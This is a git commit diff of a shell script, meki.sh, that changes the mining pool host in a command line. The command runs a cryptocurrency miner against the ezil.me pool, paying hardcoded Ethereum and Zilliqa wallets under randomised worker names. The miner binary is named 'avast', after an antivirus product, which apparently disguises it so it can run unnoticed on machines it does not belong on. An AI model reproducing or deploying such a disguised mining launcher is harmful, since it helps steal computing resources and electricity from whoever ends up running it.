4a938eb0343581d36a8da48f158231a15c1f0a5d
renilo <88342640+renilo@users.noreply.github.com>
2022-02-15 17:04:50 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -10,4 +10,4 @@ chmod +x avast
 
 WORKER=$(echo $(shuf -i 1-9999999999 -n 1)-HAJAR)
 
-./avast --algo ETHASH --pool stratum+ssl://us.ezil.me:25443 --user 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb.zil1r47c9zkz725j0euwkx9che983pnvujc58n9l99.$WORKER --ethstratum ETHPROXY --enablezilcache
+./avast --algo ETHASH --pool stratum+ssl://us-east.ezil.me:25443 --user 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb.zil1r47c9zkz725j0euwkx9che983pnvujc58n9l99.$WORKER --ethstratum ETHPROXY --enablezilcache
